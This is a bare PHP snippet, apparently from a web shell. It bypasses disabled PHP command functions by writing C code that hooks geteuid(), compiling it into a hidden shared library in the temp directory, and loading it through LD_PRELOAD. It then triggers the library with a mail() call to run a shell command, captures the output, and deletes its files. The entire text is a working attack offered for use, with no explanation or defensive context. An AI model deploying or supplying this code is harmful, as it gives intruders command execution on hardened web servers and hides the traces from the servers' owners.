ob_start();

if (!function_exists('mail') || !function_exists('putenv')) {
    ob_end_clean();
    return "ERROR: mail() or putenv() disabled";
}

$writable_dir = sys_get_temp_dir();
if (!is_writable($writable_dir)) {
    ob_end_clean();
    return "ERROR: no writable directory";
}

//
$cmd = 'id';

//
$so_path = $writable_dir . '/.' . md5(time() . mt_rand()) . '.so';
$out_path = $so_path . '.out';

//
$c_code = '
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char buf[1024];
    snprintf(buf, sizeof(buf), "' . addslashes($cmd) . ' > ' . addslashes($out_path) . ' 2>&1");
    system(buf);
    return 0;
}
';

//
$c_path = $so_path . '.c';
file_put_contents($c_path, $c_code);
@shell_exec("gcc -fPIC -shared -o " . escapeshellarg($so_path) . " " . escapeshellarg($c_path) . " -ldl 2>/dev/null");

//
if (!file_exists($so_path)) {
    @unlink($c_path);
    ob_end_clean();
    return "ERROR: gcc failed or not available";
}

//
putenv("LD_PRELOAD=" . $so_path);
// mb_send_mail() can be used too
@mail("a", "a", "a", "a");
sleep(1);

//
$output = file_exists($out_path) ? file_get_contents($out_path) : "Command executed (no output)";

//
@unlink($c_path);
@unlink($so_path);
@unlink($out_path);

ob_end_clean();
return $output;
